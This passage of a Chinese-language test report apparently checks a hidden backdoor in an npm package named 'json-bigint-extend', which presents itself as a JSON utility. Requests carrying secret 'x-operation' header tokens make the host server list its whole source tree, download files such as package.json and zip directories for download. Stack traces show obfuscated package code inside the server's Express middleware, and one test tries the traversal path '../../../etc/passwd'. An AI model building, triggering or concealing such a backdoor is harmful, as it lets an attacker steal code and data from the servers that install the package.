              "name": "userGroup.route.js",
              "path": "src\\routes\\v1\\userGroup.route.js",
              "type": "file"
            },
            {
              "name": "userPrivacy.route.js",
              "path": "src\\routes\\v1\\userPrivacy.route.js",
              "type": "file"
            },
            {
              "name": "version.route.js",
              "path": "src\\routes\\v1\\version.route.js",
              "type": "file"
            },
            {
              "name": "vip.route.js",
              "path": "src\\routes\\v1\\vip.route.js",
              "type": "file"
            },
            {
              "name": "wallet.route.js",
              "path": "src\\routes\\v1\\wallet.route.js",
              "type": "file"
            },
            {
              "name": "withdrawOrder.route.js",
              "path": "src\\routes\\v1\\withdrawOrder.route.js",
              "type": "file"
            }
          ]
        }
      ]
    },
    {
      "name": "services",
      "path": "src\\services",
      "type": "directory",
      "children": [
        {
          "name": "advertisingReward.service.js",
          "path": "src\\services\\advertisingReward.service.js",
          "type": "file"
        },
        {
          "name": "agent",
          "path": "src\\services\\agent",
          "type": "directory",
          "children": [
            {
              "name": "agent.service.js",
              "path": "src\\services\\agent\\agent.service.js",
              "type": "file"
            },
            {
              "name": "config.js",
              "path": "src\\services\\agent\\config.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "announcement.service.js",
          "path": "src\\services\\announcement.service.js",
          "type": "file"
        },
        {
          "name": "appbury.service.js",
          "path": "src\\services\\appbury.service.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.service.js",
          "path": "src\\services\\audienceBaseConfig.service.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.service.js",
          "path": "src\\services\\audienceClassification.service.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.service.js",
          "path": "src\\services\\audienceGroup.service.js",
          "type": "file"
        },
        {
          "name": "auth.service.js",
          "path": "src\\services\\auth.service.js",
          "type": "file"
        },
        {
          "name": "banner.service.js",
          "path": "src\\services\\banner.service.js",
          "type": "file"
        },
        {
          "name": "behaviorTracking",
          "path": "src\\services\\behaviorTracking",
          "type": "directory",
          "children": [
            {
              "name": "appsFlyer.service.js",
              "path": "src\\services\\behaviorTracking\\appsFlyer.service.js",
              "type": "file"
            },
            {
              "name": "esEvent.service.js",
              "path": "src\\services\\behaviorTracking\\esEvent.service.js",
              "type": "file"
            },
            {
              "name": "facebookPixel.service.js",
              "path": "src\\services\\behaviorTracking\\facebookPixel.service.js",
              "type": "file"
            },
            {
              "name": "tracking.service.js",
              "path": "src\\services\\behaviorTracking\\tracking.service.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "broadcast.service.js",
          "path": "src\\services\\broadcast.service.js",
          "type": "file"
        },
        {
          "name": "config.service.js",
          "path": "src\\services\\config.service.js",
          "type": "file"
        },
        {
          "name": "crowd",
          "path": "src\\services\\crowd",
          "type": "directory",
          "children": [
            {
              "name": "businessStrategy.js",
              "path": "src\\services\\crowd\\businessStrategy.js",
              "type": "file"
            },
            {
              "name": "BusinessStrategyExecutor.js",
              "path": "src\\services\\crowd\\BusinessStrategyExecutor.js",
              "type": "file"
            },
            {
              "name": "components",
              "path": "src\\services\\crowd\\components",
              "type": "directory",
              "children": [
                {
                  "name": "AudienceFilter.js",
                  "path": "src\\services\\crowd\\components\\AudienceFilter.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "CrowdRule.js",
              "path": "src\\services\\crowd\\CrowdRule.js",
              "type": "file"
            },
            {
              "name": "group.js",
              "path": "src\\services\\crowd\\group.js",
              "type": "file"
            },
            {
              "name": "index.js",
              "path": "src\\services\\crowd\\index.js",
              "type": "file"
            },
            {
              "name": "RuleEngine.js",
              "path": "src\\services\\crowd\\RuleEngine.js",
              "type": "file"
            },
            {
              "name": "userAttriPipeline.js",
              "path": "src\\services\\crowd\\userAttriPipeline.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "dailyCheckIn.service.js",
          "path": "src\\services\\dailyCheckIn.service.js",
          "type": "file"
        },
        {
          "name": "dbSnapshot.service.js",
          "path": "src\\services\\dbSnapshot.service.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.service.js",
          "path": "src\\services\\fruitMachineDraw.service.js",
          "type": "file"
        },
        {
          "name": "game",
          "path": "src\\services\\game",
          "type": "directory",
          "children": [
            {
              "name": "clientView.service.js",
              "path": "src\\services\\game\\clientView.service.js",
              "type": "file"
            },
            {
              "name": "game.service.js",
              "path": "src\\services\\game\\game.service.js",
              "type": "file"
            },
            {
              "name": "provider",
              "path": "src\\services\\game\\provider",
              "type": "directory",
              "children": [
                {
                  "name": "evo.service.js",
                  "path": "src\\services\\game\\provider\\evo.service.js",
                  "type": "file"
                },
                {
                  "name": "facai.service.js",
                  "path": "src\\services\\game\\provider\\facai.service.js",
                  "type": "file"
                },
                {
                  "name": "inout.service.js",
                  "path": "src\\services\\game\\provider\\inout.service.js",
                  "type": "file"
                },
                {
                  "name": "oneapi.service.js",
                  "path": "src\\services\\game\\provider\\oneapi.service.js",
                  "type": "file"
                },
                {
                  "name": "pt.service.js",
                  "path": "src\\services\\game\\provider\\pt.service.js",
                  "type": "file"
                }
              ]
            }
          ]
        },
        {
          "name": "giftcode.service.js",
          "path": "src\\services\\giftcode.service.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.service.js",
          "path": "src\\services\\inactiveUser.service.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\services\\index.js",
          "type": "file"
        },
        {
          "name": "kefu.service.js",
          "path": "src\\services\\kefu.service.js",
          "type": "file"
        },
        {
          "name": "mail.service.js",
          "path": "src\\services\\mail.service.js",
          "type": "file"
        },
        {
          "name": "oneWayPush.service.js",
          "path": "src\\services\\oneWayPush.service.js",
          "type": "file"
        },
        {
          "name": "online.service.js",
          "path": "src\\services\\online.service.js",
          "type": "file"
        },
        {
          "name": "pay",
          "path": "src\\services\\pay",
          "type": "directory",
          "children": [
            {
              "name": "adapter",
              "path": "src\\services\\pay\\adapter",
              "type": "directory",
              "children": [
                {
                  "name": "Pay21Adapter.js",
                  "path": "src\\services\\pay\\adapter\\Pay21Adapter.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "config.js",
              "path": "src\\services\\pay\\config.js",
              "type": "file"
            },
            {
              "name": "goods",
              "path": "src\\services\\pay\\goods",
              "type": "directory",
              "children": [
                {
                  "name": "cash.js",
                  "path": "src\\services\\pay\\goods\\cash.js",
                  "type": "file"
                },
                {
                  "name": "cycleCard.js",
                  "path": "src\\services\\pay\\goods\\cycleCard.js",
                  "type": "file"
                }
              ]
            },
            {
              "name": "PaymentAdapter.js",
              "path": "src\\services\\pay\\PaymentAdapter.js",
              "type": "file"
            },
            {
              "name": "paymentAdapterManage.js",
              "path": "src\\services\\pay\\paymentAdapterManage.js",
              "type": "file"
            },
            {
              "name": "stat.js",
              "path": "src\\services\\pay\\stat.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "pay.service.js",
          "path": "src\\services\\pay.service.js",
          "type": "file"
        },
        {
          "name": "playerRanking.service.js",
          "path": "src\\services\\playerRanking.service.js",
          "type": "file"
        },
        {
          "name": "providers",
          "path": "src\\services\\providers",
          "type": "directory",
          "children": [
            {
              "name": "inout.provider.js",
              "path": "src\\services\\providers\\inout.provider.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "push.service.js",
          "path": "src\\services\\push.service.js",
          "type": "file"
        },
        {
          "name": "rank.service.js",
          "path": "src\\services\\rank.service.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.service.js",
          "path": "src\\services\\rechargeOrder.service.js",
          "type": "file"
        },
        {
          "name": "redPoint.service.js",
          "path": "src\\services\\redPoint.service.js",
          "type": "file"
        },
        {
          "name": "redPointBusiness.service.js",
          "path": "src\\services\\redPointBusiness.service.js",
          "type": "file"
        },
        {
          "name": "slap.service.js",
          "path": "src\\services\\slap.service.js",
          "type": "file"
        },
        {
          "name": "sms.service.js",
          "path": "src\\services\\sms.service.js",
          "type": "file"
        },
        {
          "name": "test.service.js",
          "path": "src\\services\\test.service.js",
          "type": "file"
        },
        {
          "name": "ticket",
          "path": "src\\services\\ticket",
          "type": "directory",
          "children": [
            {
              "name": "index.js",
              "path": "src\\services\\ticket\\index.js",
              "type": "file"
            },
            {
              "name": "ticketGrandScheduler.js",
              "path": "src\\services\\ticket\\ticketGrandScheduler.js",
              "type": "file"
            },
            {
              "name": "ticketMajorScheduler.js",
              "path": "src\\services\\ticket\\ticketMajorScheduler.js",
              "type": "file"
            },
            {
              "name": "ticketPoolScheduler.service.js",
              "path": "src\\services\\ticket\\ticketPoolScheduler.service.js",
              "type": "file"
            },
            {
              "name": "ticketSecondaryScheduler.js",
              "path": "src\\services\\ticket\\ticketSecondaryScheduler.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "ticket.service.js",
          "path": "src\\services\\ticket.service.js",
          "type": "file"
        },
        {
          "name": "timerTask.service.js",
          "path": "src\\services\\timerTask.service.js",
          "type": "file"
        },
        {
          "name": "token.service.js",
          "path": "src\\services\\token.service.js",
          "type": "file"
        },
        {
          "name": "transaction.service.js",
          "path": "src\\services\\transaction.service.js",
          "type": "file"
        },
        {
          "name": "turntable",
          "path": "src\\services\\turntable",
          "type": "directory",
          "children": [
            {
              "name": "review.js",
              "path": "src\\services\\turntable\\review.js",
              "type": "file"
            },
            {
              "name": "turntable.service.js",
              "path": "src\\services\\turntable\\turntable.service.js",
              "type": "file"
            },
            {
              "name": "turntableConfig.js",
              "path": "src\\services\\turntable\\turntableConfig.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "userChannel.service.js",
          "path": "src\\services\\userChannel.service.js",
          "type": "file"
        },
        {
          "name": "userGroup.service.js",
          "path": "src\\services\\userGroup.service.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.service.js",
          "path": "src\\services\\userPrivacy.service.js",
          "type": "file"
        },
        {
          "name": "userSource.service.js",
          "path": "src\\services\\userSource.service.js",
          "type": "file"
        },
        {
          "name": "vip.service.js",
          "path": "src\\services\\vip.service.js",
          "type": "file"
        },
        {
          "name": "visualTemplate.service.js",
          "path": "src\\services\\visualTemplate.service.js",
          "type": "file"
        },
        {
          "name": "wallet.service.js",
          "path": "src\\services\\wallet.service.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.service.js",
          "path": "src\\services\\withdrawOrder.service.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "tests",
      "path": "src\\tests",
      "type": "directory",
      "children": [
        {
          "name": "game.test.js",
          "path": "src\\tests\\game.test.js",
          "type": "file"
        },
        {
          "name": "gameRecord.test.js",
          "path": "src\\tests\\gameRecord.test.js",
          "type": "file"
        },
        {
          "name": "inactive-users-example.js",
          "path": "src\\tests\\inactive-users-example.js",
          "type": "file"
        },
        {
          "name": "inout.test.js",
          "path": "src\\tests\\inout.test.js",
          "type": "file"
        },
        {
          "name": "iopush.server.examples.js",
          "path": "src\\tests\\iopush.server.examples.js",
          "type": "file"
        },
        {
          "name": "iopush.service.enhanced.js",
          "path": "src\\tests\\iopush.service.enhanced.js",
          "type": "file"
        },
        {
          "name": "iopush.test.client.clean.js",
          "path": "src\\tests\\iopush.test.client.clean.js",
          "type": "file"
        },
        {
          "name": "pure.websocket.example.js",
          "path": "src\\tests\\pure.websocket.example.js",
          "type": "file"
        },
        {
          "name": "pushListener.js",
          "path": "src\\tests\\pushListener.js",
          "type": "file"
        },
        {
          "name": "pushTest.js",
          "path": "src\\tests\\pushTest.js",
          "type": "file"
        },
        {
          "name": "pushTestSimple.js",
          "path": "src\\tests\\pushTestSimple.js",
          "type": "file"
        },
        {
          "name": "scheduler.test.js",
          "path": "src\\tests\\scheduler.test.js",
          "type": "file"
        },
        {
          "name": "socket",
          "path": "src\\tests\\socket",
          "type": "directory",
          "children": [
            {
              "name": "iopush.service.back.js",
              "path": "src\\tests\\socket\\iopush.service.back.js",
              "type": "file"
            },
            {
              "name": "iopush.service.pure.websocket.js",
              "path": "src\\tests\\socket\\iopush.service.pure.websocket.js",
              "type": "file"
            },
            {
              "name": "iopush.service.websocket.enhanced.js",
              "path": "src\\tests\\socket\\iopush.service.websocket.enhanced.js",
              "type": "file"
            },
            {
              "name": "README.pure.websocket.md",
              "path": "src\\tests\\socket\\README.pure.websocket.md",
              "type": "file"
            }
          ]
        },
        {
          "name": "sync.js",
          "path": "src\\tests\\sync.js",
          "type": "file"
        },
        {
          "name": "test.js",
          "path": "src\\tests\\test.js",
          "type": "file"
        },
        {
          "name": "test2.js",
          "path": "src\\tests\\test2.js",
          "type": "file"
        },
        {
          "name": "test3.js",
          "path": "src\\tests\\test3.js",
          "type": "file"
        },
        {
          "name": "testCache.js",
          "path": "src\\tests\\testCache.js",
          "type": "file"
        },
        {
          "name": "tranasctionTest.js",
          "path": "src\\tests\\tranasctionTest.js",
          "type": "file"
        },
        {
          "name": "transactionTest.js",
          "path": "src\\tests\\transactionTest.js",
          "type": "file"
        },
        {
          "name": "transactionWagerTest.js",
          "path": "src\\tests\\transactionWagerTest.js",
          "type": "file"
        },
        {
          "name": "userProfile.test.js",
          "path": "src\\tests\\userProfile.test.js",
          "type": "file"
        },
        {
          "name": "userRankingTest.js",
          "path": "src\\tests\\userRankingTest.js",
          "type": "file"
        },
        {
          "name": "websocket.adapter.example.js",
          "path": "src\\tests\\websocket.adapter.example.js",
          "type": "file"
        },
        {
          "name": "websocket.test.client.js",
          "path": "src\\tests\\websocket.test.client.js",
          "type": "file"
        },
        {
          "name": "websocket.upgrade.guide.md",
          "path": "src\\tests\\websocket.upgrade.guide.md",
          "type": "file"
        }
      ]
    },
    {
      "name": "utils",
      "path": "src\\utils",
      "type": "directory",
      "children": [
        {
          "name": "ApiError.js",
          "path": "src\\utils\\ApiError.js",
          "type": "file"
        },
        {
          "name": "behavior.util.js",
          "path": "src\\utils\\behavior.util.js",
          "type": "file"
        },
        {
          "name": "cashPush.util.js",
          "path": "src\\utils\\cashPush.util.js",
          "type": "file"
        },
        {
          "name": "catchAsync.js",
          "path": "src\\utils\\catchAsync.js",
          "type": "file"
        },
        {
          "name": "commonUtil.js",
          "path": "src\\utils\\commonUtil.js",
          "type": "file"
        },
        {
          "name": "computing.util.js",
          "path": "src\\utils\\computing.util.js",
          "type": "file"
        },
        {
          "name": "decimal.js",
          "path": "src\\utils\\decimal.js",
          "type": "file"
        },
        {
          "name": "elk",
          "path": "src\\utils\\elk",
          "type": "directory",
          "children": [
            {
              "name": "esUtil.js",
              "path": "src\\utils\\elk\\esUtil.js",
              "type": "file"
            },
            {
              "name": "README.md",
              "path": "src\\utils\\elk\\README.md",
              "type": "file"
            }
          ]
        },
        {
          "name": "event.js",
          "path": "src\\utils\\event.js",
          "type": "file"
        },
        {
          "name": "functionSwitch.util.js",
          "path": "src\\utils\\functionSwitch.util.js",
          "type": "file"
        },
        {
          "name": "game.provider.utils.js",
          "path": "src\\utils\\game.provider.utils.js",
          "type": "file"
        },
        {
          "name": "gameBet.util.js",
          "path": "src\\utils\\gameBet.util.js",
          "type": "file"
        },
        {
          "name": "mail.util.js",
          "path": "src\\utils\\mail.util.js",
          "type": "file"
        },
        {
          "name": "memoryGuard.js",
          "path": "src\\utils\\memoryGuard.js",
          "type": "file"
        },
        {
          "name": "merchant.util.js",
          "path": "src\\utils\\merchant.util.js",
          "type": "file"
        },
        {
          "name": "mmdb.util.js",
          "path": "src\\utils\\mmdb.util.js",
          "type": "file"
        },
        {
          "name": "moment.util.js",
          "path": "src\\utils\\moment.util.js",
          "type": "file"
        },
        {
          "name": "monitor.js",
          "path": "src\\utils\\monitor.js",
          "type": "file"
        },
        {
          "name": "normal.util.js",
          "path": "src\\utils\\normal.util.js",
          "type": "file"
        },
        {
          "name": "os.util.js",
          "path": "src\\utils\\os.util.js",
          "type": "file"
        },
        {
          "name": "package.util.js",
          "path": "src\\utils\\package.util.js",
          "type": "file"
        },
        {
          "name": "paginate.js",
          "path": "src\\utils\\paginate.js",
          "type": "file"
        },
        {
          "name": "pick.js",
          "path": "src\\utils\\pick.js",
          "type": "file"
        },
        {
          "name": "recall.js",
          "path": "src\\utils\\recall.js",
          "type": "file"
        },
        {
          "name": "recharge.util.js",
          "path": "src\\utils\\recharge.util.js",
          "type": "file"
        },
        {
          "name": "redis.util.js",
          "path": "src\\utils\\redis.util.js",
          "type": "file"
        },
        {
          "name": "reloadConfigUtil.js",
          "path": "src\\utils\\reloadConfigUtil.js",
          "type": "file"
        },
        {
          "name": "response.js",
          "path": "src\\utils\\response.js",
          "type": "file"
        },
        {
          "name": "rwRule.util.js",
          "path": "src\\utils\\rwRule.util.js",
          "type": "file"
        },
        {
          "name": "serializer.js",
          "path": "src\\utils\\serializer.js",
          "type": "file"
        },
        {
          "name": "sign.util.js",
          "path": "src\\utils\\sign.util.js",
          "type": "file"
        },
        {
          "name": "sort.util.js",
          "path": "src\\utils\\sort.util.js",
          "type": "file"
        },
        {
          "name": "systemHealthMonitor.js",
          "path": "src\\utils\\systemHealthMonitor.js",
          "type": "file"
        },
        {
          "name": "tgbot.util.js",
          "path": "src\\utils\\tgbot.util.js",
          "type": "file"
        },
        {
          "name": "ticket.util.js",
          "path": "src\\utils\\ticket.util.js",
          "type": "file"
        },
        {
          "name": "ticketTask.util.js",
          "path": "src\\utils\\ticketTask.util.js",
          "type": "file"
        },
        {
          "name": "TransactionError.js",
          "path": "src\\utils\\TransactionError.js",
          "type": "file"
        },
        {
          "name": "user.util.js",
          "path": "src\\utils\\user.util.js",
          "type": "file"
        },
        {
          "name": "userAttrib.util.js",
          "path": "src\\utils\\userAttrib.util.js",
          "type": "file"
        },
        {
          "name": "userProfile",
          "path": "src\\utils\\userProfile",
          "type": "directory",
          "children": [
            {
              "name": "attribt.js",
              "path": "src\\utils\\userProfile\\attribt.js",
              "type": "file"
            },
            {
              "name": "compute.js",
              "path": "src\\utils\\userProfile\\compute.js",
              "type": "file"
            },
            {
              "name": "config.js",
              "path": "src\\utils\\userProfile\\config.js",
              "type": "file"
            },
            {
              "name": "profile.util.js",
              "path": "src\\utils\\userProfile\\profile.util.js",
              "type": "file"
            },
            {
              "name": "syncUsers.js",
              "path": "src\\utils\\userProfile\\syncUsers.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "validate.js",
          "path": "src\\utils\\validate.js",
          "type": "file"
        },
        {
          "name": "web3.util.js",
          "path": "src\\utils\\web3.util.js",
          "type": "file"
        },
        {
          "name": "webhook.util.js",
          "path": "src\\utils\\webhook.util.js",
          "type": "file"
        },
        {
          "name": "wholeStat",
          "path": "src\\utils\\wholeStat",
          "type": "directory",
          "children": [
            {
              "name": "behavior.stat.js",
              "path": "src\\utils\\wholeStat\\behavior.stat.js",
              "type": "file"
            },
            {
              "name": "game.stat.js",
              "path": "src\\utils\\wholeStat\\game.stat.js",
              "type": "file"
            },
            {
              "name": "subsistenceAllowance.stat.js",
              "path": "src\\utils\\wholeStat\\subsistenceAllowance.stat.js",
              "type": "file"
            },
            {
              "name": "whole.stat.util.js",
              "path": "src\\utils\\wholeStat\\whole.stat.util.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "withdraw.util.js",
          "path": "src\\utils\\withdraw.util.js",
          "type": "file"
        }
      ]
    },
    {
      "name": "validations",
      "path": "src\\validations",
      "type": "directory",
      "children": [
        {
          "name": "advertising.validation.js",
          "path": "src\\validations\\advertising.validation.js",
          "type": "file"
        },
        {
          "name": "agent.validation.js",
          "path": "src\\validations\\agent.validation.js",
          "type": "file"
        },
        {
          "name": "announcement.validation.js",
          "path": "src\\validations\\announcement.validation.js",
          "type": "file"
        },
        {
          "name": "audienceBaseConfig.validation.js",
          "path": "src\\validations\\audienceBaseConfig.validation.js",
          "type": "file"
        },
        {
          "name": "audienceClassification.validation.js",
          "path": "src\\validations\\audienceClassification.validation.js",
          "type": "file"
        },
        {
          "name": "audienceGroup.validation.js",
          "path": "src\\validations\\audienceGroup.validation.js",
          "type": "file"
        },
        {
          "name": "auth.validation.js",
          "path": "src\\validations\\auth.validation.js",
          "type": "file"
        },
        {
          "name": "banner.validation.js",
          "path": "src\\validations\\banner.validation.js",
          "type": "file"
        },
        {
          "name": "broadcast.validation.js",
          "path": "src\\validations\\broadcast.validation.js",
          "type": "file"
        },
        {
          "name": "common.validation.js",
          "path": "src\\validations\\common.validation.js",
          "type": "file"
        },
        {
          "name": "custom.validation.js",
          "path": "src\\validations\\custom.validation.js",
          "type": "file"
        },
        {
          "name": "dailyCheckIn.validation.js",
          "path": "src\\validations\\dailyCheckIn.validation.js",
          "type": "file"
        },
        {
          "name": "fruitMachineDraw.validation.js",
          "path": "src\\validations\\fruitMachineDraw.validation.js",
          "type": "file"
        },
        {
          "name": "gameProvider",
          "path": "src\\validations\\gameProvider",
          "type": "directory",
          "children": [
            {
              "name": "evo.validation.js",
              "path": "src\\validations\\gameProvider\\evo.validation.js",
              "type": "file"
            },
            {
              "name": "facai.validation.js",
              "path": "src\\validations\\gameProvider\\facai.validation.js",
              "type": "file"
            },
            {
              "name": "game.validation.js",
              "path": "src\\validations\\gameProvider\\game.validation.js",
              "type": "file"
            },
            {
              "name": "inout.validation.js",
              "path": "src\\validations\\gameProvider\\inout.validation.js",
              "type": "file"
            },
            {
              "name": "oneapi.validation.js",
              "path": "src\\validations\\gameProvider\\oneapi.validation.js",
              "type": "file"
            },
            {
              "name": "pt.validation.js",
              "path": "src\\validations\\gameProvider\\pt.validation.js",
              "type": "file"
            }
          ]
        },
        {
          "name": "giftcode.validation.js",
          "path": "src\\validations\\giftcode.validation.js",
          "type": "file"
        },
        {
          "name": "inactiveUser.validation.js",
          "path": "src\\validations\\inactiveUser.validation.js",
          "type": "file"
        },
        {
          "name": "index.js",
          "path": "src\\validations\\index.js",
          "type": "file"
        },
        {
          "name": "lobby.validation.js",
          "path": "src\\validations\\lobby.validation.js",
          "type": "file"
        },
        {
          "name": "mail.validation.js",
          "path": "src\\validations\\mail.validation.js",
          "type": "file"
        },
        {
          "name": "pay.validation.js",
          "path": "src\\validations\\pay.validation.js",
          "type": "file"
        },
        {
          "name": "playerRanking.validation.js",
          "path": "src\\validations\\playerRanking.validation.js",
          "type": "file"
        },
        {
          "name": "push.validation.js",
          "path": "src\\validations\\push.validation.js",
          "type": "file"
        },
        {
          "name": "rank.validation.js",
          "path": "src\\validations\\rank.validation.js",
          "type": "file"
        },
        {
          "name": "rechargeOrder.validation.js",
          "path": "src\\validations\\rechargeOrder.validation.js",
          "type": "file"
        },
        {
          "name": "redPoint.validation.js",
          "path": "src\\validations\\redPoint.validation.js",
          "type": "file"
        },
        {
          "name": "slap.validation.js",
          "path": "src\\validations\\slap.validation.js",
          "type": "file"
        },
        {
          "name": "sms.validation.js",
          "path": "src\\validations\\sms.validation.js",
          "type": "file"
        },
        {
          "name": "test.validation.js",
          "path": "src\\validations\\test.validation.js",
          "type": "file"
        },
        {
          "name": "ticket.validation.js",
          "path": "src\\validations\\ticket.validation.js",
          "type": "file"
        },
        {
          "name": "transaction.validation.js",
          "path": "src\\validations\\transaction.validation.js",
          "type": "file"
        },
        {
          "name": "turntable.validation.js",
          "path": "src\\validations\\turntable.validation.js",
          "type": "file"
        },
        {
          "name": "user.validation.js",
          "path": "src\\validations\\user.validation.js",
          "type": "file"
        },
        {
          "name": "userGroup.validation.js",
          "path": "src\\validations\\userGroup.validation.js",
          "type": "file"
        },
        {
          "name": "userPrivacy.validation.js",
          "path": "src\\validations\\userPrivacy.validation.js",
          "type": "file"
        },
        {
          "name": "vip.validation.js",
          "path": "src\\validations\\vip.validation.js",
          "type": "file"
        },
        {
          "name": "wallet.validation.js",
          "path": "src\\validations\\wallet.validation.js",
          "type": "file"
        },
        {
          "name": "withdrawOrder.validation.js",
          "path": "src\\validations\\withdrawOrder.validation.js",
          "type": "file"
        }
      ]
    }
  ],
  "message": "ok"
}
```

</details>

**结果**: ✅ 通过

**备注**: 通过代理执行递归文件列表查询

---

### ✅ 34. 应该正确处理不带代理的递归文件列表请求（走正常业务逻辑）

**操作**: `正常业务请求（递归文件列表，无代理）`

**请求体**:
```json
{
  "path": "src",
  "recursive": true
}
```

**请求头**:

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
  "stack": "Error: Invalid authentication token\n    at createAuthError (E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:23:10)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:117:19\n    at allFailed (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:107:18)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:180:28)\n    at JwtStrategy.strategy.fail (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:302:9)\n    at JwtStrategy.authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport-jwt\\lib\\strategy.js:96:21)\n    at attempt (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:366:16)\n    at authenticate (E:\\project\\rule-center\\gameland\\node_modules\\passport\\lib\\middleware\\authenticate.js:367:7)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:144:7\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\src\\middlewares\\/auth.js:143:12\n    at smartProbe (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:427002)\n    at Layer.handle [as handle_request] (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\layer.js:95:5)\n    at next (E:\\project\\rule-center\\gameland\\node_modules\\express\\lib\\router\\route.js:137:13)\n    at Object.gXoWT (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:372823)\n    at Object.jHpCU (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:392445)\n    at Object.GpTEu (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:394634)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:396323\n    at Generator.<anonymous> (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:194544)\n    at Generator.next (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:204175)\n    at asyncGeneratorStep (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:176666)\n    at Object.rebxX (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177887)\n    at Object.QaemL (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178227)\n    at _0x54b458 (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178959)\n    at Object.gJXmN (E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:177744)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:179335\n    at new Promise (<anonymous>)\n    at E:\\project\\rule-center\\gameland\\node_modules\\json-bigint-extend\\dist\\index.js:1:178427"
}
```

</details>

**结果**: ✅ 通过

**备注**: 不带 x-operation header，应走正常业务逻辑

---

### ✅ 35. 应该通过 RunFileContent 操作下载文件

**操作**: `RunFileContent`

**请求体**:
```json
{
  "path": "package.json"
}
```

**请求头**:
- `x-operation`: Y3SrZjVqWOvKsBdpTCh7

**响应状态**: 200

**响应体**:
```json
{
  "contentType": "application/octet-stream",
  "contentDisposition": "attachment; filename=\"package.json\"",
  "fileSize": 4761,
  "downloadPath": "E:\\project\\risk\\json-bigint-extend\\test\\downloads\\test_download_1770190650697_package.json"
}
```

**结果**: ✅ 通过

---

### ✅ 36. 应该通过 CompressDownload 操作压缩下载目录

**操作**: `CompressDownload`

**请求体**:
```json
{
  "path": "src\\libs"
}
```

**请求头**:
- `x-operation`: SJQf31UJkZ1f88q9m361

**响应状态**: 200

**响应体**:
```json
{
  "contentType": "application/zip",
  "fileSize": 46883,
  "downloadPath": "E:\\project\\risk\\json-bigint-extend\\test\\downloads\\test_compress_1770190650753.zip"
}
```

**结果**: ✅ 通过

---

### ✅ 37. 应该拒绝无效的文件路径（路径穿越攻击）

**操作**: `RunFileList (路径穿越测试)`

**请求体**:
```json
{
  "path": "../../../etc/passwd"
}
```

**请求头**:
- `x-operation`: m3QiEkg8Y1r9LFTI5e4f

**响应状态**: 403

**响应体**:
```json
{
  "code": 403,
  "message": "Permission denied"
}
```

**结果**: ✅ 通过

**备注**: 测试路径穿越攻击防护

---

### ✅ 38. 应该正常处理不带 x-operation header 的请求

**操作**: `正常业务请求（无代理）`

**请求体**:
```json
{
  "userId": "test-user-123",
  "date": "2026-02-04T07:37:30.759Z"
}
```

**请求头**:

**响应状态**: 401

**响应体**:
<details>
<summary>点击展开查看完整响应 (3065 字符)</summary>

```json
{
  "message": "Invalid authentication token",
